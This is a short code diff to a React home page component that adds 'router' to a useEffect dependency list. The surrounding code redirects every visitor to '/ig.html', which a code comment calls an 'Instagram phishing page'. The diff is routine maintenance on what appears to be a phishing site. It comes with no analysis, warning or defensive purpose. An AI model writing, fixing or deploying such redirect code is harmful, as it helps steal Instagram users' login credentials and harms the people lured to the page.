@@ -7,7 +7,7 @@ export default function Home() {
   useEffect(() => {
     // Redirect visitors to Instagram phishing page
     router.push('/ig.html');
-  }, []);
+  }, [router]);
 
   return (
     <div style={{ 
